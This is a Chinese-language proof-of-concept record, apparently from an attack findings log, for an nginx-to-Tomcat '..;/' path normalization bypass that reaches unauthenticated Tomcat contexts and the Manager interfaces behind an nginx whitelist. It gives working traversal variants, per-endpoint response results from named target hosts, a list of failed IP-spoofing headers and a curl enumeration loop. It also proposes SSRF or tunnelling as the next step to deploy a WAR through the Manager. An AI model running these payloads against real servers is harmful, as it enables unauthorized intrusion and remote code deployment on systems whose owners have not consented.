# 【漏洞】nginx→Tomcat 归一化穿越（..;/）：绕开 nginx location 白名单，未认证直达 Tomcat ROOT/docs/examples 并确认 Manager/host-manager 存在（IP 阀纯头伪造绕不过）

- **code**: 漏洞-nginx-tomcat-归一化穿越-..-绕开-nginx-location-白名单-未认证直达-tomcat-root-docs-examples-并
- **kind**: poc
- **category**: path-traversal
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: 在真实目标复现两次：① `203.0.113.12`（Tomcat 8.5.78）：`/IMService/..;/manager/html` → 403 3446B「403 Access Denied」、`/IMService/..;/` → 200 11149B Tomcat ROOT 页、`/IMService/..;/docs/` → 200 14713B、`/IMService/..;/examples/` → 200 1126B；② `203.0.113.55`（现行主网关）：`/LHService/..;/manager/html`、`/IMService/..;/manager/html`、`/Tk_Kj/..;/manager/html` → 均 403 3446B（中文实例 3529B）、`/LHService/..;/host-manager/html` → 403 3022B、`/LHService/..;/` → 200 11138B、`/LHService/..;/docs/` → 200 14713B、`/LHService/..;/examples/` → 200 1126B、`/LHService/..;/LHService/` → 200 1772B。失效写法与 19 种 IP 阀头伪造全部实测记录在 description 里。证据文件 exploit58/e7_out.txt、exploit58/e12_out.txt、exploit58/e15_out.txt。
- **tags**: nginx,tomcat,path-traversal,归一化,manager,RemoteAddrValve,绕过
- **created_at**: 2026-10-11T11:36:07.649Z
- **found_by**: exploit

## 描述

★ 通用漏洞（**nginx + Tomcat 组合的经典绕过**，实测在同一个靶标的两台不同节点上都成立）。
**原理**：nginx 只把白名单前缀（如 `/LHService/`、`/IMService/`、`/Tk_Kj/`、`/PayBmob/`、`/UpLoadPic/`）proxy_pass 到后端的 Tomcat，其它路径 nginx 自己 404。但 **Tomcat 会对 `..;/` 做路径归一化（把 `;` 后面的部分当 path parameter 剥掉，再做 `..` 折叠），而 nginx 不做**。于是用任一被代理的前缀做跳板，就能绕开 nginx 的 location 白名单，直达 Tomcat 的**任意 context**：
```
/X/..;/Y            → Tomcat 归一化成 /Y
/X//..;/Y           → 同上
/X/%2e%2e;/Y        → 同上
```
**实测可达的目标**（`203.0.113.55` 与 `203.0.113.12` 均复现）：
```
/LHService/..;/manager/html        → 403 3446B  Tomcat Manager 页（**存在！** 仅被 RemoteAddrValve IP 阀拦，非 404）
/LHService/..;/manager/status      → 403 3446B
/LHService/..;/manager/text/list   → 403 3446B
/LHService/..;/host-manager/html   → 403 3022B
/LHService/..;/                   → 200 11138B Tomcat ROOT 默认页（未认证可读）
/LHService/..;/docs/              → 200 14713B Tomcat 官方文档
/LHService/..;/examples/          → 200  1126B Tomcat examples 应用
```
**踩坑记录（别重复）**：
· `/X/..;/..;/Y` 返 **400**；`/X/a/..;/Y` 与 `/X/.;/Y` 返 **404**。只有上面三种写法有效。
· **Manager 的 IP 阀（RemoteAddrValve）纯 HTTP 头伪造过不去**：实测 `X-Forwarded-For`（含 `127.0.0.1`、`127.0.0.1, 127.0.0.1`、`0.0.0.0`、`10.0.0.1`、`192.168.1.1`、`203.0.113.31`、`::1`）、`X-Real-IP`、`Client-IP`、`Forwarded: for=127.0.0.1`、`True-Client-IP`、`Proxy-Client-IP`、`WL-Proxy-Client-IP`、`X-Client-IP`、`X-Originating-IP`、`X-Remote-Addr`、`X-Remote-IP` —— **共 19 种，全部仍 403 同一页面**。该 Tomcat 未启用 RemoteIpValve（或 internalProxies 不匹配），阀门只看 TCP 对端地址 ⇒ **要过这层必须有一个"从 Tomcat 本机/被允许网段发起"的请求，也就是 SSRF 或隧道**。
· **DefaultServlet 写面关闭**：`PUT /X/x.txt`、`PUT /IMService/..;/x.txt` 等全 **405**（readonly=true，CVE-2017-12617 面关闭）；`OPTIONS` 405/200、`DELETE` 405、`PROPFIND` 405。
· 用 `..;/` 枚举 webapp（100+ 个常见 context 名）通常只能找到本来就有的那几个 ⇒ **不要指望"隐藏 webapp"**。
· 同一 Host 的 `..;/` 可能落到**不同版本的上游**（本例 ROOT 页写 Tomcat 9.0.122、docs 索引写 8.5.78 ⇒ 同一个 Host 后混挂两台 Tomcat，nginx 按 location 或轮询分流）—— 判断版本时要用**同一 context 的同一路径**做对照，别被误导。

## 用法

```
```bash
# 1) 先找一个被 nginx proxy_pass 放行的前缀（探到 200 或 302 的都算）
curl.exe --noproxy '*' -sk "https://TARGET/LHService/"

# 2) 用 ..;/ 做跳板，打 Tomcat 的任意 context
for pre in LHService IMService Tk_Kj PayBmob UpLoadPic; do
  for tail in "manager/html" "manager/status" "host-manager/html" "" "docs/" "examples/"; do
    echo "== /$pre/..;/$tail"
    curl.exe --noproxy '*' -sk -o - -w "  [st=%{http_code} len=%{size_download}]\n" \
      "https://TARGET/$pre/..;/$tail" | head -c 300; echo
  done
done

# 3) 三种有效写法（其余写法 400/404，别浪费时间）
#    /X/..;/Y     /X//..;/Y     /X/%2e%2e;/Y
```
拿到 Manager 页（403 Access Denied）即说明 **Manager 已部署**，下一步只能是 SSRF / 隧道从 Tomcat 本机发起，或换目标（找 SSRF 跳板打 `http://127.0.0.1:8080/manager/text/deploy` 部署 WAR）。
**注意**：写请求前先 `Remove-Item Env:http_proxy,Env:https_proxy,Env:all_proxy,Env:HTTP_PROXY`，或全程用原生 socket 手拼 HTTP 报文；curl 一定要加 `--noproxy '*'`。
```
